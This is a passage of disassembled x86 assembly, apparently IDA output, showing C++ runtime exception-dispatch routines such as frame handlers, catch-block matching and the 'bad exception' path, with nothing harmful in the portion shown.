                mov     eax, [ebp+var_24]
                mov     [edi-4], eax
                push    [ebp+var_28]
                call    sub_4106AB
                pop     ecx
                call    sub_412405
                mov     ecx, [ebp+var_2C]
                mov     [eax+88h], ecx
                call    sub_412405
                mov     ecx, [ebp+var_30]
                mov     [eax+8Ch], ecx
                cmp     dword ptr [esi], 0E06D7363h
                jnz     short loc_418085
                cmp     dword ptr [esi+10h], 3
                jnz     short loc_418085
                mov     eax, [esi+14h]
                cmp     eax, 19930520h
                jz      short loc_418061
                cmp     eax, 19930521h
                jz      short loc_418061
                cmp     eax, 19930522h
                jnz     short loc_418085

loc_418061:                             ; CODE XREF: sub_417EEA+167↑j
                                        ; sub_417EEA+16E↑j
                cmp     [ebp+var_34], 0
                jnz     short loc_418085
                cmp     [ebp+var_1C], 0
                jz      short loc_418085
                push    dword ptr [esi+18h]
                call    sub_410684
                pop     ecx
                test    eax, eax
                jz      short loc_418085
                push    [ebp+arg_8]
                push    esi
                call    sub_417DA8
                pop     ecx
                pop     ecx

loc_418085:                             ; CODE XREF: sub_417EEA+157↑j
                                        ; sub_417EEA+15D↑j ...
                retn
sub_417EEA      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_418086      proc near               ; CODE XREF: sub_418205+36↓p

var_1C          = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h

                push    0Ch
                push    offset stru_4230F0
                call    __SEH_prolog4
                xor     edx, edx
                mov     [ebp+var_1C], edx
                mov     eax, [ebp+arg_8]
                mov     ecx, [eax+4]
                cmp     ecx, edx
                jz      loc_4181FD
                cmp     [ecx+8], dl
                jz      loc_4181FD
                mov     ecx, [eax+8]
                cmp     ecx, edx
                jnz     short loc_4180C1
                test    dword ptr [eax], 80000000h
                jz      loc_4181FD

loc_4180C1:                             ; CODE XREF: sub_418086+2D↑j
                mov     eax, [eax]
                mov     esi, [ebp+arg_4]
                test    eax, eax
                js      short loc_4180CE
                lea     esi, [ecx+esi+0Ch]

loc_4180CE:                             ; CODE XREF: sub_418086+42↑j
                mov     [ebp+ms_exc.registration.TryLevel], edx
                xor     ebx, ebx
                inc     ebx
                push    ebx
                test    al, 8
                jz      short loc_41811A
                mov     edi, [ebp+arg_0]
                push    dword ptr [edi+18h]
                call    sub_41C87E
                pop     ecx
                pop     ecx
                test    eax, eax
                jz      loc_4181E0
                push    ebx
                push    esi
                call    sub_41C87E
                pop     ecx
                pop     ecx
                test    eax, eax
                jz      loc_4181E0
                mov     eax, [edi+18h]
                mov     [esi], eax
                mov     ecx, [ebp+arg_C]
                add     ecx, 8
                push    ecx

loc_41810B:                             ; CODE XREF: sub_418086+E7↓j
                push    eax
                call    sub_417DFD
                pop     ecx
                pop     ecx
                mov     [esi], eax
                jmp     loc_4181E5
; ---------------------------------------------------------------------------

loc_41811A:                             ; CODE XREF: sub_418086+51↑j
                mov     edi, [ebp+arg_C]
                mov     eax, [ebp+arg_0]
                push    dword ptr [eax+18h]
                test    [edi], bl
                jz      short loc_41816F
                call    sub_41C87E
                pop     ecx
                pop     ecx
                test    eax, eax
                jz      loc_4181E0
                push    ebx
                push    esi
                call    sub_41C87E
                pop     ecx
                pop     ecx
                test    eax, eax
                jz      loc_4181E0
                push    dword ptr [edi+14h]
                mov     eax, [ebp+arg_0]
                push    dword ptr [eax+18h]
                push    esi
                call    sub_40F9F0
                add     esp, 0Ch
                cmp     dword ptr [edi+14h], 4
                jnz     loc_4181E5
                mov     eax, [esi]
                test    eax, eax
                jz      short loc_4181E5
                add     edi, 8
                push    edi
                jmp     short loc_41810B
; ---------------------------------------------------------------------------

loc_41816F:                             ; CODE XREF: sub_418086+9F↑j
                cmp     [edi+18h], edx
                jnz     short loc_4181AC
                call    sub_41C87E
                pop     ecx
                pop     ecx
                test    eax, eax
                jz      short loc_4181E0
                push    ebx
                push    esi
                call    sub_41C87E
                pop     ecx
                pop     ecx
                test    eax, eax
                jz      short loc_4181E0
                push    dword ptr [edi+14h]
                add     edi, 8
                push    edi
                mov     eax, [ebp+arg_0]
                push    dword ptr [eax+18h]
                call    sub_417DFD
                pop     ecx
                pop     ecx
                push    eax
                push    esi
                call    sub_40F9F0
                add     esp, 0Ch
                jmp     short loc_4181E5
; ---------------------------------------------------------------------------

loc_4181AC:                             ; CODE XREF: sub_418086+EC↑j
                call    sub_41C87E
                pop     ecx
                pop     ecx
                test    eax, eax
                jz      short loc_4181E0
                push    ebx
                push    esi
                call    sub_41C87E
                pop     ecx
                pop     ecx
                test    eax, eax
                jz      short loc_4181E0
                push    dword ptr [edi+18h]
                call    sub_41C87E
                pop     ecx
                test    eax, eax
                jz      short loc_4181E0
                test    byte ptr [edi], 4
                push    0
                pop     eax
                setnz   al
                inc     eax
                mov     [ebp+var_1C], eax
                jmp     short loc_4181E5
; ---------------------------------------------------------------------------

loc_4181E0:                             ; CODE XREF: sub_418086+62↑j
                                        ; sub_418086+73↑j ...
                call    sub_41888F
; ---------------------------------------------------------------------------

loc_4181E5:                             ; CODE XREF: sub_418086+8F↑j
                                        ; sub_418086+D7↑j ...
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                mov     eax, [ebp+var_1C]
                jmp     short loc_4181FF
; ---------------------------------------------------------------------------

loc_4181F1:                             ; DATA XREF: .rdata:stru_4230F0↓o
                xor     eax, eax
                inc     eax
                retn
; ---------------------------------------------------------------------------

loc_4181F5:                             ; DATA XREF: .rdata:stru_4230F0↓o
                mov     esp, [ebp+ms_exc.old_esp]
                call    sub_418843
; ---------------------------------------------------------------------------

loc_4181FD:                             ; CODE XREF: sub_418086+19↑j
                                        ; sub_418086+22↑j ...
                xor     eax, eax

loc_4181FF:                             ; CODE XREF: sub_418086+169↑j
                call    __SEH_epilog4
                retn
sub_418086      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_418205      proc near               ; CODE XREF: sub_418297+13↓p

ms_exc          = CPPEH_RECORD ptr -18h
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h

                push    8
                push    offset stru_423110
                call    __SEH_prolog4
                mov     eax, [ebp+arg_8]
                test    dword ptr [eax], 80000000h
                jz      short loc_418221
                mov     ebx, [ebp+arg_4]
                jmp     short loc_41822B
; ---------------------------------------------------------------------------

loc_418221:                             ; CODE XREF: sub_418205+15↑j
                mov     ecx, [eax+8]
                mov     edx, [ebp+arg_4]
                lea     ebx, [ecx+edx+0Ch]

loc_41822B:                             ; CODE XREF: sub_418205+1A↑j
                and     [ebp+ms_exc.registration.TryLevel], 0
                mov     esi, [ebp+arg_C]
                push    esi
                push    eax
                push    [ebp+arg_4]
                mov     edi, [ebp+arg_0]
                push    edi
                call    sub_418086
                add     esp, 10h
                dec     eax
                jz      short loc_418265
                dec     eax
                jnz     short loc_41827D
                push    1
                lea     eax, [esi+8]
                push    eax
                push    dword ptr [edi+18h]
                call    sub_417DFD
                pop     ecx
                pop     ecx
                push    eax
                push    dword ptr [esi+18h]
                push    ebx
                call    sub_4103A9
                jmp     short loc_41827D
; ---------------------------------------------------------------------------

loc_418265:                             ; CODE XREF: sub_418205+3F↑j
                lea     eax, [esi+8]
                push    eax
                push    dword ptr [edi+18h]
                call    sub_417DFD
                pop     ecx
                pop     ecx
                push    eax
                push    dword ptr [esi+18h]
                push    ebx
                call    sub_4103A9

loc_41827D:                             ; CODE XREF: sub_418205+42↑j
                                        ; sub_418205+5E↑j
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    __SEH_epilog4
                retn
; ---------------------------------------------------------------------------

loc_41828A:                             ; DATA XREF: .rdata:stru_423110↓o
                xor     eax, eax
                inc     eax
                retn
; ---------------------------------------------------------------------------

loc_41828E:                             ; DATA XREF: .rdata:stru_423110↓o
                mov     esp, [ebp+ms_exc.old_esp]
                call    sub_418843
sub_418205      endp

; ---------------------------------------------------------------------------
                db 0CCh

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_418297(PEXCEPTION_RECORD ExceptionRecord, int, int, int, int, int, PVOID TargetFrame)
sub_418297      proc near               ; CODE XREF: sub_418305+D6↓p
                                        ; sub_4183F9+24E↓p

ExceptionRecord = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h
arg_10          = dword ptr  18h
arg_14          = dword ptr  1Ch
TargetFrame     = dword ptr  20h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                cmp     [ebp+arg_10], 0
                jz      short loc_4182B2
                push    [ebp+arg_10]
                push    ebx
                push    esi
                push    [ebp+ExceptionRecord]
                call    sub_418205
                add     esp, 10h

loc_4182B2:                             ; CODE XREF: sub_418297+9↑j
                cmp     [ebp+TargetFrame], 0
                push    [ebp+ExceptionRecord] ; ExceptionRecord
                jnz     short loc_4182BE
                push    esi
                jmp     short loc_4182C1
; ---------------------------------------------------------------------------

loc_4182BE:                             ; CODE XREF: sub_418297+22↑j
                push    [ebp+TargetFrame] ; TargetFrame

loc_4182C1:                             ; CODE XREF: sub_418297+25↑j
                call    sub_4103B0
                push    dword ptr [edi]
                push    [ebp+arg_C]
                push    [ebp+arg_8]
                push    esi
                call    sub_417C82
                mov     eax, [edi+4]
                push    100h
                push    [ebp+arg_14]
                inc     eax
                push    [ebp+arg_C]
                mov     [esi+8], eax
                push    [ebp+arg_4]
                mov     ecx, [ebx+0Ch]
                push    esi
                push    [ebp+ExceptionRecord]
                call    sub_417EEA
                add     esp, 28h
                test    eax, eax
                jz      short loc_418303
                push    esi
                push    eax
                call    sub_410377

loc_418303:                             ; CODE XREF: sub_418297+63↑j
                pop     ebp
                retn
sub_418297      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_418305(PEXCEPTION_RECORD ExceptionRecord, int, int, int, int, int, int, PVOID TargetFrame)
sub_418305      proc near               ; CODE XREF: sub_4183F9+327↓p

var_8           = dword ptr -8
var_4           = dword ptr -4
ExceptionRecord = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h
arg_10          = dword ptr  18h
arg_14          = dword ptr  1Ch
arg_18          = dword ptr  20h
TargetFrame     = dword ptr  24h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                push    ecx
                push    esi
                mov     esi, [ebp+ExceptionRecord]
                cmp     dword ptr [esi], 80000003h
                jz      loc_4183F6
                push    edi
                call    sub_412405
                cmp     dword ptr [eax+80h], 0
                jz      short loc_41836A
                call    sub_412405
                lea     edi, [eax+80h]
                call    sub_412173
                cmp     [edi], eax
                jz      short loc_41836A
                cmp     dword ptr [esi], 0E0434F4Dh
                jz      short loc_41836A
                push    [ebp+TargetFrame]
                push    [ebp+arg_18]
                push    [ebp+arg_10]
                push    [ebp+arg_C]
                push    [ebp+arg_8]
                push    [ebp+arg_4]
                push    esi
                call    sub_41046D
                add     esp, 1Ch
                test    eax, eax
                jnz     loc_4183F5

loc_41836A:                             ; CODE XREF: sub_418305+24↑j
                                        ; sub_418305+38↑j ...
                mov     edi, [ebp+arg_10]
                cmp     dword ptr [edi+0Ch], 0
                jnz     short loc_418378
                call    sub_41888F
; ---------------------------------------------------------------------------

loc_418378:                             ; CODE XREF: sub_418305+6C↑j
                mov     esi, [ebp+arg_14]
                lea     eax, [ebp+var_8]
                push    eax
                lea     eax, [ebp+var_4]
                push    eax
                push    esi
                push    [ebp+arg_18]
                push    edi
                call    sub_4105E3
                mov     edi, eax
                mov     eax, [ebp+var_4]
                add     esp, 14h
                cmp     eax, [ebp+var_8]
                jnb     short loc_4183F5
                push    ebx

loc_41839B:                             ; CODE XREF: sub_418305+ED↓j
                cmp     esi, [edi]
                jl      short loc_4183E6
                cmp     esi, [edi+4]
                jg      short loc_4183E6
                mov     eax, [edi+0Ch]
                mov     ecx, [edi+10h]
                shl     eax, 4
                add     eax, ecx
                mov     ecx, [eax-0Ch]
                test    ecx, ecx
                jz      short loc_4183BC
                cmp     byte ptr [ecx+8], 0
                jnz     short loc_4183E6

loc_4183BC:                             ; CODE XREF: sub_418305+AF↑j
                lea     ebx, [eax-10h]
                test    byte ptr [ebx], 40h
                jnz     short loc_4183E6
                push    [ebp+TargetFrame] ; TargetFrame
                mov     esi, [ebp+arg_4]
                push    [ebp+arg_18]    ; int
                push    0               ; int
                push    [ebp+arg_10]    ; int
                push    [ebp+arg_C]     ; int
                push    [ebp+arg_8]     ; int
                push    [ebp+ExceptionRecord] ; ExceptionRecord
                call    sub_418297
                mov     esi, [ebp+arg_14]
                add     esp, 1Ch

loc_4183E6:                             ; CODE XREF: sub_418305+98↑j
                                        ; sub_418305+9D↑j ...
                inc     [ebp+var_4]
                mov     eax, [ebp+var_4]
                add     edi, 14h
                cmp     eax, [ebp+var_8]
                jb      short loc_41839B
                pop     ebx

loc_4183F5:                             ; CODE XREF: sub_418305+5F↑j
                                        ; sub_418305+93↑j
                pop     edi

loc_4183F6:                             ; CODE XREF: sub_418305+11↑j
                pop     esi
                leave
                retn
sub_418305      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_4183F9(PEXCEPTION_RECORD ExceptionRecord, int, int, int, int, char, int, PVOID TargetFrame)
sub_4183F9      proc near               ; CODE XREF: sub_41875D+D6↓p

var_2C          = byte ptr -2Ch
var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_1           = byte ptr -1
ExceptionRecord = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h
arg_10          = dword ptr  18h
arg_14          = byte ptr  1Ch
arg_18          = dword ptr  20h
TargetFrame     = dword ptr  24h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 2Ch
                mov     ecx, [ebp+arg_4]
                push    ebx
                mov     ebx, [ebp+arg_10]
                mov     eax, [ebx+4]
                cmp     eax, 80h
                push    esi
                push    edi
                mov     [ebp+var_1], 0
                jg      short loc_41841E
                movsx   ecx, byte ptr [ecx+8]
                jmp     short loc_418421
; ---------------------------------------------------------------------------

loc_41841E:                             ; CODE XREF: sub_4183F9+1D↑j
                mov     ecx, [ecx+8]

loc_418421:                             ; CODE XREF: sub_4183F9+23↑j
                cmp     ecx, 0FFFFFFFFh
                mov     [ebp+var_8], ecx
                jl      short loc_41842D
                cmp     ecx, eax
                jl      short loc_418432

loc_41842D:                             ; CODE XREF: sub_4183F9+2E↑j
                call    sub_41888F
; ---------------------------------------------------------------------------

loc_418432:                             ; CODE XREF: sub_4183F9+32↑j
                mov     esi, [ebp+ExceptionRecord]
                mov     edi, 0E06D7363h
                cmp     [esi], edi
                jnz     loc_4186FC
                cmp     dword ptr [esi+10h], 3
                mov     ebx, 19930520h
                jnz     loc_418569
                mov     eax, [esi+14h]
                cmp     eax, ebx
                jz      short loc_41846A
                cmp     eax, 19930521h
                jz      short loc_41846A
                cmp     eax, 19930522h
                jnz     loc_418569

loc_41846A:                             ; CODE XREF: sub_4183F9+5D↑j
                                        ; sub_4183F9+64↑j
                cmp     dword ptr [esi+1Ch], 0
                jnz     loc_418569
                call    sub_412405
                cmp     dword ptr [eax+88h], 0
                jz      loc_41873B
                call    sub_412405
                mov     esi, [eax+88h]
                mov     [ebp+ExceptionRecord], esi
                call    sub_412405
                mov     eax, [eax+8Ch]
                push    1
                push    esi
                mov     [ebp+arg_8], eax
                call    sub_41C87E
                pop     ecx
                pop     ecx
                test    eax, eax
                jnz     short loc_4184B5
                call    sub_41888F
; ---------------------------------------------------------------------------

loc_4184B5:                             ; CODE XREF: sub_4183F9+B5↑j
                cmp     [esi], edi
                jnz     short loc_4184DF
                cmp     dword ptr [esi+10h], 3
                jnz     short loc_4184DF
                mov     eax, [esi+14h]
                cmp     eax, ebx
                jz      short loc_4184D4
                cmp     eax, 19930521h
                jz      short loc_4184D4
                cmp     eax, 19930522h
                jnz     short loc_4184DF

loc_4184D4:                             ; CODE XREF: sub_4183F9+CB↑j
                                        ; sub_4183F9+D2↑j
                cmp     dword ptr [esi+1Ch], 0
                jnz     short loc_4184DF
                call    sub_41888F
; ---------------------------------------------------------------------------

loc_4184DF:                             ; CODE XREF: sub_4183F9+BE↑j
                                        ; sub_4183F9+C4↑j ...
                call    sub_412405
                cmp     dword ptr [eax+94h], 0
                jz      short loc_418569
                call    sub_412405
                mov     edi, [eax+94h]
                call    sub_412405
                push    [ebp+ExceptionRecord]
                xor     esi, esi
                mov     [eax+94h], esi
                call    sub_417E26
                pop     ecx
                test    al, al
                jnz     short loc_418561
                xor     ebx, ebx
                cmp     [edi], ebx
                jle     short loc_418535

loc_418518:                             ; CODE XREF: sub_4183F9+13A↓j
                mov     eax, [edi+4]
                mov     ecx, [ebx+eax+4]
                push    offset off_425DB4
                call    sub_40F7D0
                test    al, al
                jnz     short loc_41853A
                inc     esi
                add     ebx, 10h
                cmp     esi, [edi]
                jl      short loc_418518

loc_418535:                             ; CODE XREF: sub_4183F9+11D↑j
                                        ; sub_4183F9+30D↓j
                call    sub_418843
; ---------------------------------------------------------------------------

loc_41853A:                             ; CODE XREF: sub_4183F9+132↑j
                push    1
                push    [ebp+ExceptionRecord]
                call    sub_417DA8
                pop     ecx
                pop     ecx
                push    offset aBadException ; "bad exception"
                lea     ecx, [ebp+var_2C]
                call    sub_417B8A
                push    offset unk_42312C
                lea     eax, [ebp+var_2C]
                push    eax
                call    sub_41032B

loc_418561:                             ; CODE XREF: sub_4183F9+117↑j
                mov     esi, [ebp+ExceptionRecord]
                mov     edi, 0E06D7363h

loc_418569:                             ; CODE XREF: sub_4183F9+52↑j
                                        ; sub_4183F9+6B↑j ...
                cmp     [esi], edi
                jnz     loc_4186F9
                cmp     dword ptr [esi+10h], 3
                jnz     loc_4186F9
                mov     eax, [esi+14h]
                cmp     eax, ebx
                jz      short loc_418594
                cmp     eax, 19930521h
                jz      short loc_418594
                cmp     eax, 19930522h
                jnz     loc_4186F9

loc_418594:                             ; CODE XREF: sub_4183F9+187↑j
                                        ; sub_4183F9+18E↑j
                mov     edi, [ebp+arg_10]
                cmp     dword ptr [edi+0Ch], 0
                jbe     loc_418660
                lea     eax, [ebp+var_1C]
                push    eax
                lea     eax, [ebp+var_10]
                push    eax
                push    [ebp+var_8]
                push    [ebp+arg_18]
                push    edi
                call    sub_4105E3
                add     esp, 14h
                mov     edi, eax

loc_4185BA:                             ; CODE XREF: sub_4183F9+25F↓j
                mov     eax, [ebp+var_10]
                cmp     eax, [ebp+var_1C]
                jnb     loc_41865D
                mov     eax, [ebp+var_8]
                cmp     [edi], eax
                jg      loc_418652
                cmp     eax, [edi+4]
                jg      short loc_418652
                mov     eax, [edi+10h]
                mov     [ebp+var_C], eax
                mov     eax, [edi+0Ch]
                mov     [ebp+var_18], eax
                test    eax, eax
                jle     short loc_418652

loc_4185E6:                             ; CODE XREF: sub_4183F9+22D↓j
                mov     eax, [esi+1Ch]
                mov     eax, [eax+0Ch]
                lea     ebx, [eax+4]
                mov     eax, [eax]
                mov     [ebp+var_14], eax
                test    eax, eax
                jle     short loc_41861B

loc_4185F8:                             ; CODE XREF: sub_4183F9+220↓j
                push    dword ptr [esi+1Ch]
                mov     eax, [ebx]
                push    eax
                push    [ebp+var_C]
                mov     [ebp+var_20], eax
                call    sub_417BDA
                add     esp, 0Ch
                test    eax, eax
                jnz     short loc_41862A
                dec     [ebp+var_14]
                add     ebx, 4
                cmp     [ebp+var_14], eax
                jg      short loc_4185F8

loc_41861B:                             ; CODE XREF: sub_4183F9+1FD↑j
                dec     [ebp+var_18]
                add     [ebp+var_C], 10h
                cmp     [ebp+var_18], 0
                jg      short loc_4185E6
                jmp     short loc_418652
; ---------------------------------------------------------------------------

loc_41862A:                             ; CODE XREF: sub_4183F9+215↑j
                push    [ebp+TargetFrame] ; TargetFrame
                mov     ebx, [ebp+var_C]
                push    [ebp+arg_18]    ; int
                mov     [ebp+var_1], 1
                push    [ebp+var_20]    ; int
                push    [ebp+arg_10]    ; int
                push    [ebp+arg_C]     ; int
                push    [ebp+arg_8]     ; int
                push    esi             ; ExceptionRecord
                mov     esi, [ebp+arg_4]
                call    sub_418297
                mov     esi, [ebp+ExceptionRecord]
                add     esp, 1Ch

loc_418652:                             ; CODE XREF: sub_4183F9+1D2↑j
                                        ; sub_4183F9+1DB↑j ...
                inc     [ebp+var_10]
                add     edi, 14h
                jmp     loc_4185BA
; ---------------------------------------------------------------------------

loc_41865D:                             ; CODE XREF: sub_4183F9+1C7↑j
                mov     edi, [ebp+arg_10]

loc_418660:                             ; CODE XREF: sub_4183F9+1A2↑j
                cmp     [ebp+arg_14], 0
                jz      short loc_418670
                push    1
                push    esi
                call    sub_417DA8
                pop     ecx
                pop     ecx

loc_418670:                             ; CODE XREF: sub_4183F9+26B↑j
                cmp     [ebp+var_1], 0
                jnz     loc_418728
                mov     eax, [edi]
                and     eax, 1FFFFFFFh
                cmp     eax, 19930521h
                jb      loc_418728
                mov     edi, [edi+1Ch]
                test    edi, edi
                jz      loc_418728
                push    esi
                call    sub_417E26
                pop     ecx
                test    al, al
                jnz     loc_418728
                call    sub_412405
                call    sub_412405
                call    sub_412405
                mov     [eax+88h], esi
                call    sub_412405
                cmp     [ebp+TargetFrame], 0
                mov     ecx, [ebp+arg_8]
                mov     [eax+8Ch], ecx
                push    esi             ; ExceptionRecord
                jnz     short loc_4186D5
                push    [ebp+arg_4]
                jmp     short loc_4186D8
; ---------------------------------------------------------------------------

loc_4186D5:                             ; CODE XREF: sub_4183F9+2D5↑j
                push    [ebp+TargetFrame] ; TargetFrame

loc_4186D8:                             ; CODE XREF: sub_4183F9+2DA↑j
                call    sub_4103B0
                mov     esi, [ebp+arg_10]
                push    0FFFFFFFFh
                push    esi
                push    [ebp+arg_C]
                push    [ebp+arg_4]
                call    sub_417C82
                add     esp, 10h
                push    dword ptr [esi+1Ch]
                call    sub_417EA1
; ---------------------------------------------------------------------------

loc_4186F9:                             ; CODE XREF: sub_4183F9+172↑j
                                        ; sub_4183F9+17C↑j ...
                mov     ebx, [ebp+arg_10]

loc_4186FC:                             ; CODE XREF: sub_4183F9+43↑j
                cmp     dword ptr [ebx+0Ch], 0
                jbe     short loc_418728
                cmp     [ebp+arg_14], 0
                jnz     loc_418535
                push    [ebp+TargetFrame] ; TargetFrame
                push    [ebp+arg_18]    ; int
                push    [ebp+var_8]     ; int
                push    ebx             ; int
                push    [ebp+arg_C]     ; int
                push    [ebp+arg_8]     ; int
                push    [ebp+arg_4]     ; int
                push    esi             ; ExceptionRecord
                call    sub_418305
                add     esp, 20h

loc_418728:                             ; CODE XREF: sub_4183F9+27B↑j
                                        ; sub_4183F9+28D↑j ...
                call    sub_412405
                cmp     dword ptr [eax+94h], 0
                jz      short loc_41873B
                call    sub_41888F
; ---------------------------------------------------------------------------

loc_41873B:                             ; CODE XREF: sub_4183F9+87↑j
                                        ; sub_4183F9+33B↑j
                pop     edi
                pop     esi
                pop     ebx
                leave
                retn
sub_4183F9      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_418740      proc near               ; DATA XREF: .rdata:00423160↓o

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                push    [ebp+arg_0]
                mov     esi, ecx
                call    sub_40E6B9
                mov     dword ptr [esi], offset off_420AFC
                mov     eax, esi
                pop     esi
                pop     ebp
                retn    4
sub_418740      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_41875D(PEXCEPTION_RECORD ExceptionRecord, int, int, int, int, int, PVOID TargetFrame, char)
sub_41875D      proc near               ; CODE XREF: ___CxxFrameHandler3+21↑p
                                        ; sub_41043A+28↑p ...

ExceptionRecord = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h
arg_10          = dword ptr  18h
arg_14          = dword ptr  1Ch
TargetFrame     = dword ptr  20h
arg_1C          = byte ptr  24h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ebx
                push    esi
                push    edi
                call    sub_412405
                cmp     dword ptr [eax+20Ch], 0
                mov     eax, [ebp+arg_10]
                mov     ecx, [ebp+ExceptionRecord]
                mov     edi, 0E06D7363h
                mov     esi, 1FFFFFFFh
                mov     ebx, 19930522h
                jnz     short loc_4187A8
                mov     edx, [ecx]
                cmp     edx, edi
                jz      short loc_4187A8
                cmp     edx, 80000026h
                jz      short loc_4187A8
                mov     edx, [eax]
                and     edx, esi
                cmp     edx, ebx
                jb      short loc_4187A8
                test    byte ptr [eax+20h], 1
                jnz     loc_41883B

loc_4187A8:                             ; CODE XREF: sub_41875D+29↑j
                                        ; sub_41875D+2F↑j ...
                test    byte ptr [ecx+4], 66h
                jz      short loc_4187D1
                cmp     dword ptr [eax+4], 0
                jz      loc_41883B
                cmp     [ebp+arg_14], 0
                jnz     short loc_41883B
                push    0FFFFFFFFh
                push    eax
                push    [ebp+arg_C]
                push    [ebp+arg_4]
                call    sub_417C82
                add     esp, 10h
                jmp     short loc_41883B
; ---------------------------------------------------------------------------

loc_4187D1:                             ; CODE XREF: sub_41875D+4F↑j
                cmp     dword ptr [eax+0Ch], 0
                jnz     short loc_4187E9
                mov     edx, [eax]
                and     edx, esi
                cmp     edx, 19930521h
                jb      short loc_41883B
                cmp     dword ptr [eax+1Ch], 0
                jz      short loc_41883B

loc_4187E9:                             ; CODE XREF: sub_41875D+78↑j
                cmp     [ecx], edi
                jnz     short loc_41881F
                cmp     dword ptr [ecx+10h], 3
                jb      short loc_41881F
                cmp     [ecx+14h], ebx
                jbe     short loc_41881F
                mov     edx, [ecx+1Ch]
                mov     edx, [edx+8]
                test    edx, edx
                jz      short loc_41881F
                movzx   esi, [ebp+arg_1C]
                push    esi
                push    [ebp+TargetFrame]
                push    [ebp+arg_14]
                push    eax
                push    [ebp+arg_C]
                push    [ebp+arg_8]
                push    [ebp+arg_4]
                push    ecx
                call    edx
                add     esp, 20h
                jmp     short loc_41883E
; ---------------------------------------------------------------------------

loc_41881F:                             ; CODE XREF: sub_41875D+8E↑j
                                        ; sub_41875D+94↑j ...
                push    [ebp+TargetFrame] ; TargetFrame
                push    [ebp+arg_14]    ; int
                push    dword ptr [ebp+arg_1C] ; char
                push    eax             ; int
                push    [ebp+arg_C]     ; int
                push    [ebp+arg_8]     ; int
                push    [ebp+arg_4]     ; int
                push    ecx             ; ExceptionRecord
                call    sub_4183F9
                add     esp, 20h

loc_41883B:                             ; CODE XREF: sub_41875D+45↑j
                                        ; sub_41875D+55↑j ...
                xor     eax, eax
                inc     eax

loc_41883E:                             ; CODE XREF: sub_41875D+C0↑j
                pop     edi
                pop     esi
                pop     ebx
                pop     ebp
                retn
sub_41875D      endp


; =============== S U B R O U T I N E =======================================

; Attributes: noreturn bp-based frame

sub_418843      proc near               ; CODE XREF: TopLevelExceptionFilter:loc_417625↑p
                                        ; sub_417C39+26↑j ...

ms_exc          = CPPEH_RECORD ptr -18h

                push    8
                push    offset stru_423168
                call    __SEH_prolog4
                call    sub_412405
                mov     eax, [eax+78h]
                test    eax, eax
                jz      short loc_418871
                and     [ebp+ms_exc.registration.TryLevel], 0
                call    eax
                jmp     short loc_41886A
; ---------------------------------------------------------------------------

loc_418863:                             ; DATA XREF: .rdata:stru_423168↓o
                xor     eax, eax
                inc     eax
                retn
; ---------------------------------------------------------------------------

loc_418867:                             ; DATA XREF: .rdata:stru_423168↓o
                mov     esp, [ebp+ms_exc.old_esp]

loc_41886A:                             ; CODE XREF: sub_418843+1E↑j
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh

loc_418871:                             ; CODE XREF: sub_418843+16↑j
                call    sub_41C890
sub_418843      endp

; ---------------------------------------------------------------------------
                call    __SEH_epilog4
                retn

; =============== S U B R O U T I N E =======================================

; Attributes: noreturn

sub_41887C      proc near               ; CODE XREF: sub_417EA1+23↑p
                call    sub_412405
                mov     eax, [eax+7Ch]
                test    eax, eax
                jz      short loc_41888A
                call    eax

loc_41888A:                             ; CODE XREF: sub_41887C+A↑j
                jmp     sub_418843
sub_41887C      endp


; =============== S U B R O U T I N E =======================================

; Attributes: noreturn bp-based frame

sub_41888F      proc near               ; CODE XREF: sub_4105E3+1E↑p
                                        ; sub_4105E3:loc_410646↑p ...

ms_exc          = CPPEH_RECORD ptr -18h

                push    8
                push    offset stru_423188
                call    __SEH_prolog4
                push    dword_42B42C
                call    sub_41217C
                pop     ecx
                test    eax, eax
                jz      short loc_4188C1
                and     [ebp+ms_exc.registration.TryLevel], 0
                call    eax
                jmp     short loc_4188BA
; ---------------------------------------------------------------------------

loc_4188B3:                             ; DATA XREF: .rdata:stru_423188↓o
                xor     eax, eax
                inc     eax
                retn
; ---------------------------------------------------------------------------

loc_4188B7:                             ; DATA XREF: .rdata:stru_423188↓o
                mov     esp, [ebp+ms_exc.old_esp]

loc_4188BA:                             ; CODE XREF: sub_41888F+22↑j
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh

loc_4188C1:                             ; CODE XREF: sub_41888F+1A↑j
                call    sub_418843
sub_41888F      endp

; ---------------------------------------------------------------------------
                db 0CCh

; =============== S U B R O U T I N E =======================================


sub_4188C7      proc near               ; CODE XREF: sub_41301F+35↑p
                push    offset sub_418843
                call    sub_412101
                pop     ecx
                mov     dword_42B42C, eax
                retn
sub_4188C7      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

